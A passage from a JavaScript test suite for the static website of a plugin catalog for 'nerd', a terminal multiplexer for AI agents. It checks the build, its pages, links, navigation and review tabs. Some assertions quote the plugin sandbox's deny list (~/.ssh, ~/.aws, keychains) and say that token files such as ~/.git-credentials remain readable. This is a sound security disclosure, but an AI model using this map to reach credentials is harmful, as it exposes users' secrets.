  const env = { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1', GIT_AUTHOR_NAME: 't', GIT_AUTHOR_EMAIL: 't@example.com', GIT_COMMITTER_NAME: 't', GIT_COMMITTER_EMAIL: 't@example.com' };
  const git = (...a) => execFileSync('git', ['-C', dir, ...a], { env, encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] });
  git('init', '--quiet');
  for (const [f, v] of Object.entries(files)) {
    if (typeof v === 'object' && typeof v.link === 'string') fs.symlinkSync(v.link, path.join(dir, f));
    else fs.writeFileSync(path.join(dir, f), typeof v === 'string' ? v : JSON.stringify(v));
  }
  git('add', '-A');
  git('commit', '--quiet', '-m', 'one');
  return { dir, git, commit: git('rev-parse', 'HEAD').trim() };
}

test('a plugin.json that links to a file in the plugin is read as nerd reads it; one leading outside is unavailable', () => {
  const real = { name: 'linky', permissions: { network: { hosts: ['api.linky.dev'], ports: [443] } } };
  const { dir, git, commit } = pluginRepo({ 'real.json': real, 'plugin.json': { link: 'real.json' } });
  const src = readSource(dir, { abilities: [] }, [commit], git);
  assert.deepEqual(src.manifest.permissions.network.hosts, ['api.linky.dev']);
  assert.deepEqual(src.manifests[commit].permissions.network.hosts, ['api.linky.dev'], 'the release in history follows the link too');
  // The page shows the host.
  const { root, dir: data } = fixtureCatalog();
  fs.writeFileSync(path.join(data, 'beta.json'), JSON.stringify(src));
  const { data: d } = catalog(root, data, { nerdRepo, today: '2026-10-05', nerd: null });
  assert.deepEqual(d.plugins[1].can.network, { hosts: ['api.linky.dev'], ports: [443] });
  const outside = tmp('outside');
  fs.writeFileSync(path.join(outside, 'x.json'), JSON.stringify({ name: 'x' }));
  const away = pluginRepo({ 'plugin.json': { link: path.join(outside, 'x.json') } });
  assert.throws(() => readSource(away.dir, { abilities: [] }, [], away.git), /leads outside the plugin/);
  assert.throws(() => readSource(pluginRepo({ 'README.md': '# none' }).dir, { abilities: [] }, [], git), /no plugin.json/);
});

test('a licence file over the cap is named as too large, not guessed', () => {
  const { dir, git } = pluginRepo({ 'plugin.json': { name: 'big' }, LICENSE: 'MIT License\n' + 'x'.repeat(README_MAX) });
  const src = readSource(dir, { abilities: [] }, [], git);
  assert.equal(src.licence, null);
  assert.deepEqual(src.notes, ['Its licence file is over 256 KB, too large to read here; see its repository.']);
  assert.equal(readSource(pluginRepo({ 'plugin.json': { name: 'm' }, LICENSE: 'MIT License' }).dir, { abilities: [] }, [], git).licence, 'MIT');
});

test("a plugin's stars over 30 days come from stars.json's history, one count per day, shorter when the counts are", () => {
  const { root, dir } = fixtureCatalog();
  const { data: d } = catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null });
  const [alpha, beta] = d.plugins;
  // 6 September to 27 September at 40, 28 September to 4 October at 50, today 70.
  assert.deepEqual(alpha.stars30, [...Array(22).fill(40), ...Array(7).fill(50), 70]);
  assert.equal(alpha.stars30From, '2026-09-06');
  assert.deepEqual(beta.stars30, [3, 3, 3, 3, 3, 3, 3, 5]);
  assert.equal(beta.stars30From, '2026-09-28');
  assert.equal(d.updated, '2026-10-05');
});

test('permissions version by version, maintenance, and the last commit of the fetched branch', () => {
  const { root, dir } = fixtureCatalog();
  const { data: d } = catalog(root, dir, { nerdRepo, today: '2026-10-05', nerd: null });
  const alpha = d.plugins[0];
  assert.deepEqual([alpha.versions[0].widened, alpha.versions[1].widened], [true, false]);
  assert.deepEqual(alpha.versions[0].diff, [['+', '"permissions": {"network":{"hosts":["api.example.com"],"ports":[443]}}'], ['+', '"commands": [{"id":"r"}]']]);
  assert.equal(alpha.versions[1].diff, null);
  // From a fetched repository: the newest commit's day on its branch, whatever commit the catalog pins.
  const { git } = pluginRepo({ 'plugin.json': { name: 'x' } });
  assert.equal(lastCommitOf(git), git('log', '-1', '--format=%cs').trim());
  assert.match(lastCommitOf(git), /^\d{4}-\d{2}-\d{2}$/);
  assert.equal(widened({ network: null, files: null, agent: null }, { network: 'localhost', files: null, agent: null }), true);
  assert.equal(widened({ network: { hosts: ['a'], ports: [443] }, files: null, agent: null }, { network: { hosts: ['a'], ports: [443] }, files: null, agent: null }), false);
  assert.equal(manifestDiff({ version: '1', a: 1 }, { version: '2', a: 1 }), null, 'a version bump alone is no difference');
});

const read = (out, ...f) => fs.readFileSync(path.join(out, ...f), 'utf8');
/** A built page by its address; its main; the words of a piece of markup. */
const page = (out, p) => read(out, p, 'index.html');
const main = (h) => h.slice(h.indexOf('<main id="main">') + 16, h.lastIndexOf('</main>'));
const text = (h) => h.replace(/<[^>]+>/g, '').replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/\s+/g, ' ').trim();

test('the build has no example plugin, no variation switch and no inline style, and ships what the page loads', () => {
  const { root, dir } = fixtureCatalog();
  const out = tmp('clean');
  build(out, dir, root, { nerdRepo, today: '2026-10-05', nerd: '0.10.0' });
  const pages = fs.readdirSync(out, { recursive: true }).filter((f) => f.endsWith('.html'));
  const own = [...pages, 'app.js', 'render.js', 'theme.js', 'space.js', 'style.css'].map((f) => [f, read(out, f)]);
  for (const [f, text] of own) assert.ok(!/data-v\b|example-plugins|example-review|exampleReceipt|makeExamplePlugins/.test(text), `${f} has no variation or example leftovers`);
  for (const [f, text] of own.filter(([f]) => !f.endsWith('.html'))) assert.ok(!/example/i.test(text), `${f} has no example data`);
  for (const [f, text] of own) assert.ok(!text.includes('id="sw"') && !/ style="/.test(text), `${f}: no switcher, no style attribute (the policy allows none)`);
  assert.ok(!JSON.parse(read(out, 'catalog.json')).plugins.some((p) => /example/i.test(p.name)), 'no example plugin');
  for (const f of ['brand/nerd-logo-light.svg', 'brand/nerd-logo-dark.svg', 'brand/nerd-wordmark-light.svg', 'brand/nerd-wordmark-dark.svg', 'favicon.svg', 'og.png', 'robots.txt', 'sitemap.xml', 'install.sh', 'data.js', 'render.js']) assert.ok(fs.existsSync(path.join(out, f)), f);
  assert.ok(!fs.existsSync(path.join(out, 'pages.js')) && !fs.existsSync(path.join(out, 'nerd-docs.js')), 'the docs are rendered at build time, not shipped');
  const render = read(out, 'render.js');
  assert.match(render, /const THEME_KEY = 'nerd-plugins-theme';/);
  assert.match(render, /const RECENT_KEY = 'nerd-plugins-recent';/);
  assert.ok(!/[Ss]upport nerd/.test(render + read(out, 'app.js')), 'no support block');
  for (const f of fs.readdirSync(out, { recursive: true }).filter((f) => /\.(html|js|css|json)$/.test(f) && !f.startsWith('vendor'))) assert.ok(!read(out, f).includes('[owner:'), `${f} has no placeholder`);
  // every plugin can also read other programs' command lines and environments (nerd's docs/plugins.md)
  for (const f of ['app.js', 'render.js', 'home.js', 'catalog-front.js']) assert.ok(!/may do only what its manifest names/.test(read(out, f)), `${f} does not say a plugin may do only what its manifest names`);
  // nerd denies a fixed list (src/plugins.rs SECRET), not a category: ~/.codex/auth.json and ~/.git-credentials are readable
  for (const f of ['app.js', 'render.js', 'home.js', 'catalog-front.js']) assert.ok(!/credential folders|keys and credentials/.test(read(out, f)), `${f} names what nerd denies, not "credential folders"`);
  assert.match(read(out, 'data.js'), /"readable":\["~\/\.codex\/auth\.json","~\/\.git-credentials"\]/, 'the pages say another token file is readable');
  // the browser's data is what its conveniences read: no README, no rendered docs
  const w = {}; new Function('window', read(out, 'data.js'))(w);
  assert.ok(w.NERD_DATA.plugins.length === 3 && w.NERD_DATA.plugins.every((p) => !('readme' in p)) && w.NERD_DOCS.docs.every((d) => !('html' in d)) && !('changelog' in w.NERD_DOCS), 'data.js carries neither READMEs nor the docs\' text');
});

// ---- the pages as files: what a visitor with no script sees, read straight from the build

/** The fixture catalog as a site with what the page tests need: a recording and a README, two plugins that add previews, one source gone, one tag with markup in it. */
function uiSite() {
  const { root, dir } = fixtureCatalog();
  const cast = '{"version":2,"width":80,"height":24}\n[0.1,"o","hi"]\n';
  const alpha = JSON.parse(fs.readFileSync(path.join(dir, 'alpha.json'), 'utf8'));
  fs.writeFileSync(path.join(dir, 'alpha.json'), JSON.stringify({ ...alpha, cast, readme: '# Alpha\n\nAlpha previews database files.' }));
  fs.writeFileSync(path.join(dir, 'gamma.json'), JSON.stringify(data({ abilities: ['Learns which .log files you select, and reads them'], min_nerd: '0.9.0', manifest: { name: 'gamma', previews: [{ extensions: ['log'] }] } })));
  fs.rmSync(path.join(dir, 'beta.json'));
  const beta = JSON.parse(fs.readFileSync(path.join(root, 'plugins', 'beta.json'), 'utf8'));
  fs.writeFileSync(path.join(root, 'plugins', 'beta.json'), JSON.stringify({ ...beta, tag: '<b>v9</b>' }));
  const out = tmp('ui');
  build(out, dir, root, { nerdRepo, today: '2026-10-05', nerd: '0.10.0' });
  const split = tmp('ui-split');
  build(split, dir, root, { nerdRepo: nerdSplit, today: '2026-10-05', nerd: '0.10.0' });
  return { out, split };
}
let site;
const sites = () => (site ??= uiSite());

// the panel of a page: its sections, each row's classes and label
const tree = (h) => h.slice(h.indexOf('<aside id="tree"'), h.indexOf('</aside>'));
const sections = (h) => tree(h).split('<div class="sec open">').slice(1).map((s) => ({ h: text(s.match(/<div class="h">(.*?)<\/div>/)[1]), rows: [...s.matchAll(/<a class="tr([^"]*)"[^>]*><span class="g"[^>]*><\/span><span class="l">(.*?)<\/span>(?:<span class="n">(.*?)<\/span>)?<\/a>/g)].map((m) => ({ cls: m[1], l: text(m[2]), n: m[3] ?? null })) }));
const lit = (h) => sections(h).flatMap((s) => s.rows).filter((r) => / on\b/.test(r.cls)).map((r) => r.l + (r.n ?? ''));
const navOf = (h) => ({ sections: sections(h).map((s) => s.h), rows: sections(h).flatMap((s) => s.rows.map((r) => r.l)) });
const hrefs = (h) => [...main(h).matchAll(/href="([^"]*)"/g)].map((m) => m[1]);
const pagesOf = (out) => fs.readdirSync(out, { recursive: true }).filter((f) => f.endsWith('index.html')).map((f) => '/' + f.slice(0, -'index.html'.length));

test('every page is its own file, complete without a script, with its address, title and description', () => {
  const { out } = sites();
  const list = pagesOf(out).sort();
  assert.deepEqual(list, ['/', '/about/', '/authors/nerdterm/', '/authors/other/', '/authors/someone/', '/changelog/', '/contact/', '/docs/', '/docs/license/', '/docs/messages-between-agents/', '/docs/plugins/', '/docs/quick-start/', '/docs/usage/', '/install/', '/legal/', '/plugins/', '/plugins/add/', '/plugins/all/', '/plugins/alpha/', '/plugins/alpha/related/', '/plugins/alpha/releases/', '/plugins/alpha/review/', '/plugins/beta/', '/plugins/beta/releases/', '/plugins/beta/review/', '/plugins/gamma/', '/plugins/gamma/related/', '/plugins/gamma/releases/', '/plugins/gamma/review/', '/plugins/review/', '/plugins/why/', '/privacy/', '/security/']);
  const sitemap = [...read(out, 'sitemap.xml').matchAll(/<loc>https:\/\/nerdterm\.dev(\/[^<]*)<\/loc>/g)].map((m) => m[1]).sort();
  assert.deepEqual(sitemap, list.filter((p) => p !== '/docs/'), 'the sitemap lists every page; /docs/ only opens the first docs page');
  assert.match(read(out, 'docs', 'index.html'), /<meta http-equiv="refresh" content="0; url=\/docs\/quick-start\/">/);
  assert.match(read(out, 'robots.txt'), /Sitemap: https:\/\/nerdterm\.dev\/sitemap\.xml/);
  const titles = new Set();
  for (const p of sitemap) {
    const h = page(out, p);
    const title = h.match(/<title>([^<]*)<\/title>/)?.[1], desc = h.match(/<meta name="description" content="([^"]*)"/)?.[1];
    assert.ok(title && desc, `${p} has a title and a description`);
    assert.ok(!titles.has(title), `${p}: ${title} names one page`); titles.add(title);
    assert.ok(h.includes(`<link rel="canonical" href="https://nerdterm.dev${p}">`) && h.includes(`<meta property="og:url" content="https://nerdterm.dev${p}">`), `${p} names its own address`);
    assert.ok(h.includes(`<meta property="og:title" content="${title}">`) && h.includes(`<meta property="og:description" content="${desc}">`), `${p}: the same title and description for a link preview`);
    assert.ok(text(main(h)).length > 60, `${p} has its text in the file: ${text(main(h)).slice(0, 80)}`);
    assert.ok(/<main id="main"><div class="page|<main id="main"><section class="frame/.test(h), `${p} opens with a frame`);
    assert.ok(h.includes('id="sVer" href="/changelog/">nerd 0.10.0<'), `${p}: the status line names the version`);
  }
  assert.equal(page(out, '/').match(/<title>([^<]*)<\/title>/)[1], 'nerd: a terminal multiplexer that shows what your AI agents are doing');
  assert.equal(page(out, '/plugins/alpha/').match(/<meta name="description" content="([^"]*)"/)[1], 'S', 'a plugin page is described by its summary');
  assert.match(page(out, '/docs/usage/').match(/<meta name="description" content="([^"]*)"/)[1], /^After installing a new version, a card says Update available\./, 'a docs page by its first paragraph');
  // nothing in the build sends a visitor to a hash route, and nothing is a hash route
  for (const f of fs.readdirSync(out, { recursive: true }).filter((f) => /\.(html|js|css|json|xml|txt)$/.test(f) && !f.startsWith('vendor'))) assert.ok(!read(out, f).includes('#/'), `${f} has no hash route`);
  const nf = read(out, '404.html');
  assert.match(text(main(nf)), /This address does not exist\.Nothing is at this address\./);
  assert.ok(nf.includes('<script src="/app.js?v=') && nf.includes('href="/style.css?v='), 'the not-found page loads the site from its root, wherever it is shown');
});

test('a plugin named like a page of the site stops the build', () => {
  const { root, dir } = fixtureCatalog();
  fs.copyFileSync(path.join(root, 'plugins', 'alpha.json'), path.join(root, 'plugins', 'all.json'));
  fs.copyFileSync(path.join(dir, 'alpha.json'), path.join(dir, 'all.json'));
  assert.throws(() => build(tmp('clash'), dir, root, { nerdRepo, today: '2026-10-05', nerd: '0.10.0' }), /a plugin cannot be called all: \/plugins\/all\/ is a page of the site/);
});

test('every in-site link of every page leads to a page that exists, and to its anchor when it names one', () => {
  for (const out of Object.values(sites())) {
    const links = new Set(pagesOf(out).flatMap((p) => hrefs(page(out, p)).filter((h) => h.startsWith('/'))));
    assert.ok(links.size >= 30, `${links.size} links checked`);
    const broken = [...links].filter((l) => {
      const [p, a] = l.split('#');
      const file = p.endsWith('/') ? path.join(out, p, 'index.html') : path.join(out, p.split('?')[0]);
      if (!fs.existsSync(file)) return true;
      return a && !fs.readFileSync(file, 'utf8').includes(`id="${a}"`);
    });
    assert.deepEqual(broken, []);
  }
});

test('the panel is the whole site map, the same on every page; only the highlight follows the page', () => {
  const { out } = sites();
  const home = page(out, '/');
  assert.deepEqual(navOf(home).sections, ['nerd', 'plugins', 'this site']);
  assert.deepEqual(sections(home)[0].rows.filter((r) => !/ sub\b/.test(r.cls)).map((r) => r.l), ['Home', 'Install', 'Docs', 'Security', 'Changelog']);
  assert.deepEqual(sections(home)[0].rows.filter((r) => / sub\b/.test(r.cls)).map((r) => r.l), ['Quick start', 'Usage', 'Plugins', 'Messages between agents', 'License'], 'every README section without a page of its own, and the plugin guide, always listed');
  assert.deepEqual(sections(home)[2].rows.map((r) => r.l), ['About', 'Contact', 'Privacy', 'Legal']);
  assert.deepEqual(lit(home), ['Home']);
  const on = {};
  for (const p of pagesOf(out).filter((p) => p !== '/docs/')) {
    const h = page(out, p);
    assert.deepEqual(navOf(h), navOf(home), `${p}: the same rows on every page`);
    on[p] = lit(h);
  }
  assert.deepEqual(on['/plugins/why/'], ['Why nerd plugins']);
  assert.deepEqual(on['/plugins/all/'], ['All plugins3']);
  assert.deepEqual(on['/plugins/review/'], ['How review works']);
  assert.deepEqual(on['/plugins/add/'], ['Add your plugin']);
  assert.deepEqual(on['/about/'], ['About']);
  assert.deepEqual(on['/docs/usage/'], ['Usage']);
  assert.deepEqual(on['/plugins/alpha/'], ['All plugins3'], 'a plugin lights the list it belongs to');
  assert.deepEqual(on['/plugins/alpha/review/'], ['All plugins3']);
  assert.deepEqual(on['/authors/someone/'], ['All plugins3']);
  assert.deepEqual(on['/install/'], ['Install']);
  assert.deepEqual(on['/plugins/'], ['Catalog']);
  assert.equal(sections(home)[0].rows.find((r) => r.l === 'Docs').cls.includes(' on'), false);
  assert.ok(tree(home).includes('href="/docs/quick-start/"><span class="g" aria-hidden="true"></span><span class="l">Docs</span>'), 'Docs opens the first docs page');
  assert.ok(tree(home).includes('href="/plugins/all/?adds=previews"'), 'a kind of plugin is the list filtered by it');
});

test('the home page is nerd drawn as a plan, then its README, and the status line keeps only what it needs', () => {
  const { out } = sites();
  const h = page(out, '/'), m = main(h);
  assert.equal(text(m.match(/<h1>(.*?)<\/h1>/)[1]), 'Shells. Agents. You decide.');
  assert.deepEqual([...m.matchAll(/<div class="h7d"[^>]*><b>(.*?)<\/b>/g)].map((x) => text(x[1])), ['git', 'curl to GitHub', 'ssh', 'a plugin with network', 'pane proxy', 'a link or a file', 'the clipboard', 'Claude Code’s inbox']);
  assert.deepEqual([...m.matchAll(/<div class="h7d"[^>]*><b>.*?<\/b><code>(.*?)<\/code>/g)].map((x) => text(x[1].replace('<br>', ''))), ['git clone …', 'release check: …', 'remote: ssh …', 'plugin … started: network …plugin … proxy: …', 'pane N proxy: …', 'link opened …', 'copied N characters', 'message … via inbox: delivered']);
  const markers = nerdDocs(nerdRepo).egress.sort();
  assert.equal(markers.length, 10, 'the fixture README marks every way out nerd has');
  assert.deepEqual([...m.matchAll(/data-egress="([^"]+)"/g)].map((x) => x[1]).sort(), markers, 'every way out README marks has its room, door or line on the plan');
  assert.deepEqual([...m.matchAll(/<h2 id="[^"]*" class="h7h">(.*?)<\/h2>/g)].map((x) => text(x[1])), ['Start in a minute', 'What nerd knows about your agents', 'What else is in it', 'Plugins', 'Limits, said plainly']);
  assert.deepEqual([...m.matchAll(/<tbody><tr><td>(.*?)<\/td>/g)].map((x) => text(x[1])), ['Claude Code'], 'the agents table is the README\'s');
  assert.ok(m.includes('<ul><li>') && m.includes('<ul class="h7feats"><li>'), 'the README\'s lists are on the page as they are');
  assert.deepEqual([...h.matchAll(/<footer id="status">(.*?)<\/footer>/gs)].map((x) => text(x[1])), ['nerd 0.10.0GitHubSystemLightDark'], 'the theme switch is in the page, lit by theme.js before the first paint');
  // no block asking for money; the README's "mouse support" is a requirement, not a plea
  assert.ok(!/support (nerd|us|the project)|donat|sponsor/i.test(text(h)));
});

test('the catalog front: what plugins are, one plugin\'s sandbox and its doors, then the catalog', () => {
  const { out } = sites();
  const m = main(page(out, '/plugins/'));
  assert.equal(text(m.match(/<h1>(.*?)<\/h1>/)[1]), 'Plugins that show what they may do.');
  assert.match([...m.matchAll(/<p class="h7fine">(.*?)<\/p>/g)].map((x) => text(x[1])).at(-1), /^3 plugins · 3 authors · \+22 stars this week · open source only$/);
  assert.deepEqual([...m.matchAll(/<button class="btn" data-pi="\d+"[^>]*>(.*?)<\/button>/g)].map((x) => text(x[1])), ['alpha', 'beta', 'gamma', 'an example with network']);
  assert.deepEqual([...m.matchAll(/<div class="h7d cf-d( shut)?"[^>]*><b>(.*?)<\/b>/g)].map((x) => `${text(x[2])} ${x[1] ? 'shut' : 'open'}`), ['nerd open', 'your files shut', 'the network open', 'coding agents shut']);
  assert.deepEqual([...m.matchAll(/<a class="h7row"[^>]*><b>(.*?)<\/b>/g)].map((x) => text(x[1])), ['alpha', 'beta', 'gamma']);
  assert.equal(text(m.match(/data-k="reads"[^>]*>.*?<div class="h7b">(.*?)<\/div>/s)[1]), "your files, except ~/.ssh, ~/.aws, the shell histories, the whole of ~/Library (keychains, cookies) and nerd's state root (sessions, logs). Any other file in your home folder is readable, token files such as ~/.codex/auth.json and ~/.git-credentials included. Other programs’ command lines and environments are readable too.", 'the reads cell is the fixture guide\'s list');
  assert.ok(!/support|donat|sponsor/i.test(text(m)));
});

test('with nerd\'s docs split into docs/ pages, the panel lists them and the pages keep their places', () => {
  const { split } = sites();
  assert.deepEqual(sections(page(split, '/install/'))[0].rows.filter((r) => / sub\b/.test(r.cls)).map((r) => r.l), ['Quick start', 'Usage', 'Isolation', 'Messages between agents', 'Plugins', 'Troubleshooting', 'License']);
  assert.match(text(main(page(split, '/install/')).match(/<section class="frame " id="updating">(.*?)<\/section>/s)[1]), /a card says Update available/, 'Install takes Updating from docs/usage.md, an <h3> there');
  assert.ok(main(page(split, '/docs/usage/')).includes('href="https://github.com/nerdterm/nerd/edit/master/docs/usage.md"'), 'Edit on GitHub opens the page\'s own file');
  assert.equal(text(main(page(split, '/security/')).match(/<ul class="plain pg-sum">(?:.*?<li>){3}(.*?)<\/li>/s)[1]), 'Each way out starts from something you do or approved, and writes a line to daemon.log. The list is below.');
  assert.ok(page(split, '/security/').includes('id="how-it-works"'), 'the old How it works section lives on the Security page');
  assert.ok(!fs.existsSync(path.join(split, 'docs', 'how-it-works')) && !fs.existsSync(path.join(split, 'docs', 'requirements')), 'no page for a section that is part of another');
});

test('a docs page is nerd\'s README section', () => {
  const { out } = sites();
  const m = main(page(out, '/docs/quick-start/'));
  assert.equal(text(m.match(/<section class="frame primary"><h2 class="t">(.*?)<\/h2>/)[1]), 'Quick start');
  assert.match(text(m), /nerd --resume/);
});

test('a plugin page shows the recording, the four rooms, the README and the Related tab with its count', () => {
  const { out } = sites();
  const m = main(page(out, '/plugins/alpha/'));
  assert.match(m, /<section class="frame rec primary"><h2 class="t">alpha running in nerd<\/h2>/);
  assert.match(m, /<div id="pl1" data-cast="alpha" data-fp="[0-9a-f]{10}" data-cols="80" data-rows="24"><\/div><div class="ctl">/, 'the player\'s box carries the recording\'s name, size and fingerprint for the browser');
  assert.match(text(m.match(/<div class="ctl">(.*?)<\/div>/)[1]), /^PauseRestart\d+ s, 80 by 24 cells$/);
  const rooms = [...m.matchAll(/<div class="rcell ([^"]*)">(.*?)<\/div>/g)].map((x) => [x[1], text(x[2])]);
  assert.deepEqual(rooms.map(([c]) => c), ['shows on', 'files', 'network on', 'agent']);
  assert.match(rooms[0][1], /previews/);
  assert.match(rooms[2][1], /only api\.example\.com on port 443/);
  assert.match(rooms[1][1], /walled off/);
  assert.match(text(m.match(/<div class="readme">(.*?)<\/div>/s)[1]), /Alpha previews database files\./);
  assert.deepEqual([...m.match(/<div class="ptabs">(.*?)<\/div>/)[1].matchAll(/<a href="([^"]*)"[^>]*>(.*?)<\/a>/g)].map((x) => [x[1], text(x[2])]), [['/plugins/alpha/', 'Overview'], ['/plugins/alpha/review/', 'Review'], ['/plugins/alpha/releases/', 'Releases'], ['/plugins/alpha/related/', 'Related 1']]);
  const cmds = [...m.matchAll(/<div class="cmd"><code>(.*?)<\/code>/g)].map((x) => text(x[1]));
  assert.equal(cmds[0], 'nerd --plugin-add https://github.com/nerdterm/alpha');
  assert.equal(cmds[1], 'git ls-remote https://github.com/nerdterm/alpha refs/tags/v1.1.0', 'the command that shows the tag is the commit');
  assert.deepEqual([...m.matchAll(/data-tip="(Official[^"]*)"/g)].map((x) => x[1]), ['Official: published by the nerd project']);
  assert.ok(m.includes('<h3 class="sect">Official: published by the nerd project</h3>'));
  assert.ok(m.includes('href="/authors/nerdterm/"'), 'the author links to the author page');
  assert.deepEqual([...main(page(out, '/plugins/alpha/related/')).matchAll(/<a class="rel-i"[^>]*><span class="nm">(.*?)<\/span>/g)].map((x) => text(x[1])), ['gamma']);
  assert.ok(!fs.existsSync(path.join(out, 'plugins', 'alpha', 'overview')), 'the overview is the plugin\'s own address');
  assert.ok(main(page(out, '/plugins/gamma/')).includes('class="noshot big snap4"'), 'no recording: the sketch, which app.js shapes');
});

test('the Review tab shows each release as the catalog has it and invents no checks', () => {
  const { out } = sites();
  const info = main(page(out, '/plugins/alpha/review/')).match(/<section class="frame fill info">.*?<div class="body">(.*?)<\/div><\/section>/s)[1];
  const t = text(info);
  assert.match(t, /v1\.1\.0 reviewed/);
  assert.ok(t.includes('bbbbbbbbbb') && t.includes('20 September 2026'), t);
  assert.deepEqual([...info.matchAll(/<dt>(.*?)<\/dt>/g)].map((x) => x[1]), ['commit', 'in the catalog', 'review', 'pull request']);
  const links = [...info.matchAll(/href="([^"]*)"/g)].map((x) => x[1]);
  assert.ok(links.includes('https://github.com/nerdterm/alpha/commit/' + B));
  assert.ok(links.includes('https://github.com/nerdterm/nerd-plugins/pull/7'), 'the catalog pull request, when the history names one');
  assert.ok(links.includes('/plugins/alpha/review/?r=v1.0.0'), 'another release is the same page with its tag in the query');
  assert.match(t, /The full receipt of each check will appear here once the review publishes it\./);
  assert.ok(!/example|OSV|GuardDog|YARA|Gitleaks|lockfile|sandbox trial|sample/i.test(t) && !/class="(rcpt|rc)"/.test(info), t);
  assert.match(info, /<a class="btn" href="\/plugins\/alpha\/review\/\?r=v1\.1\.0" aria-pressed="true">/);
  assert.match(text(main(page(out, '/plugins/alpha/releases/'))), /What each release may do, version by version/);
});

test('revoked and unavailable plugins say so, and an author’s markup stays text', () => {
  const { out } = sites();
  const notices = (p) => [...main(page(out, p)).matchAll(/<p class="notice [^"]*">(.*?)<\/p>/g)].map((x) => x[1]);
  assert.ok(notices('/plugins/gamma/').some((n) => /Revoked\.<\/b> The catalog revoked v1\.0\.0 on 3 October: it read files outside the tree\. nerd will not run it\. Do not install it\./.test(n)), notices('/plugins/gamma/').join('|'));
  const beta = notices('/plugins/beta/');
  assert.ok(beta.some((n) => /^<b>Revoked\.<\/b> The catalog warns about &lt;b&gt;v9&lt;\/b&gt; on 3 October: it logs a token\. nerd warns whoever has it\.$/.test(n)), beta.join('|'));
  assert.ok(beta.some((n) => /^<b>Source unavailable at build time\.<\/b>/.test(n)));
  const b = main(page(out, '/plugins/beta/'));
  assert.ok(b.includes('&lt;b&gt;v9&lt;/b&gt;') && !b.includes('<b>v9</b>'), 'a tag is escaped');
  assert.match(text(b.match(/<section class="frame rooms-f">(.*?)<\/section>/s)[1]), /could not be read at build time\. It is unknown, not none\./);
  assert.match(text(main(page(out, '/plugins/all/')).match(/<a class="lr" href="\/plugins\/beta\/">(.*?)<\/a>/)[1]), /Writes files, details unknown/);
});

test('each site page holds its text and no placeholder', () => {
  const { out } = sites();
  const pages = {};
  for (const [k, p] of [['why', '/plugins/why/'], ['about', '/about/'], ['contact', '/contact/'], ['privacy', '/privacy/'], ['legal', '/legal/']]) {
    const m = main(page(out, p));
    pages[k] = { title: text(m.match(/<h2 class="t">(.*?)<\/h2>/)[1]), text: text(m.match(/<div class="prose">(.*?)<\/div><\/section>/s)[1]), hrefs: hrefs(page(out, p)), cells: (m.match(/<div class="cell">/g) || []).length };
    assert.ok(pages[k].text.length > 200, `${k} has text`);
    assert.ok(!pages[k].text.includes('[owner:') && !m.includes('class="ph"'), k);
    assert.ok(!/support nerd|donat/i.test(pages[k].text), k);
    assert.ok(!/\b(best|leading|revolutionary|world-class)\b/i.test(pages[k].text), `${k}: no slogans`);
  }
  assert.equal(pages.why.title, 'why nerd plugins');
  assert.equal(pages.why.cells, 4, 'four blocks');
  assert.match(pages.why.text, /your files except those the plugin guide names: ~\/\.ssh, ~\/\.aws, the shell histories, the whole of ~\/Library \(keychains, cookies\) and nerd's state root \(sessions, logs\)\. Any other file in your home folder is readable, token files such as ~\/\.codex\/auth\.json and ~\/\.git-credentials included\./);
  assert.match(pages.about.text, /terminal multiplexer for AI agents on macOS/);
  assert.match(pages.about.text, /No accounts\. No cookies\. No analytics and no download counts\. nerd reads the catalog only when you choose Refresh catalog\./);
  assert.ok(pages.about.hrefs.includes('https://github.com/nerdterm/nerd') && pages.about.hrefs.includes('https://github.com/nerdterm/nerd-plugins') && pages.about.hrefs.includes('/catalog.json'));
  assert.ok(pages.contact.hrefs.includes('https://github.com/nerdterm/nerd/blob/master/SECURITY.md'));
  assert.ok(pages.contact.hrefs.some((h) => h.startsWith('https://github.com/nerdterm/nerd-plugins/issues')));
  for (const key of ['nerd-plugins-theme', 'nerd-plugins-recent']) assert.ok(pages.privacy.text.includes(key), key);
  assert.match(pages.privacy.text, /sets no cookies/);
  assert.match(pages.privacy.text, /hosted on GitHub Pages\. GitHub logs visitors’ IP addresses for security and operations/);
  assert.ok(pages.privacy.hrefs.includes('https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement'));
  assert.match(pages.about.text, /made by Evgeniy Kovrov \(github\.com\/nyxene\), a private person, as a personal, non-commercial open-source project; no money is taken\./);
  assert.match(pages.contact.text, /There is no e-mail address\./);
  assert.ok(pages.contact.hrefs.includes('https://github.com/nerdterm/nerd/issues'));
  assert.match(pages.legal.text, /Evgeniy Kovrov \(github\.com\/nyxene\), a private person\./);
  assert.match(pages.legal.text, /“nerd” and its logo are the project’s names\. Other names belong to their owners\./);
  assert.ok(!/imprint/i.test(pages.legal.text), 'no imprint');
  assert.ok(pages.legal.hrefs.includes('https://github.com/nerdterm/nerd-plugins/blob/main/LICENSE'));
});

// ---- the pages in a browser: one headless Chrome run drives every scenario that needs a script, and each test reads its part of the result.

const CHROME = [process.env.CHROME, '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome', '/usr/bin/google-chrome', '/usr/bin/chromium', '/usr/bin/chromium-browser'].find((c) => c && fs.existsSync(c));

const DRIVE = String.raw`<!doctype html><meta charset="utf-8"><body><script>
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function open(url, w, h) {
  document.querySelectorAll('iframe').forEach((x) => x.remove());
  const f = document.createElement('iframe');
  f.style.cssText = 'width:' + (w || 1440) + 'px;height:' + (h || 900) + 'px;border:0;display:block';
  document.body.append(f);
  const i = url.indexOf('#'), p = i < 0 ? url : url.slice(0, i), a = i < 0 ? '' : url.slice(i);
  f.src = p + (p.includes('?') ? '&' : '?') + 'theme=dark' + a;
  await new Promise((r) => (f.onload = r));
  for (let i = 0; i < 100 && !f.contentDocument.querySelector('#main .frame'); i++) await sleep(100);
  await sleep(300);
  return { W: f.contentWindow, D: f.contentDocument };
}
const txt = (e) => (e ? e.textContent.replace(/\s+/g, ' ').trim() : null);
const all = (D, s) => [...D.querySelectorAll(s)];
const rect = (e) => { const r = e.getBoundingClientRect(); return { x: r.x, y: r.y, w: r.width, h: r.height }; };
const key = (W, el, k) => el.dispatchEvent(new W.KeyboardEvent('keydown', { key: k, bubbles: true }));
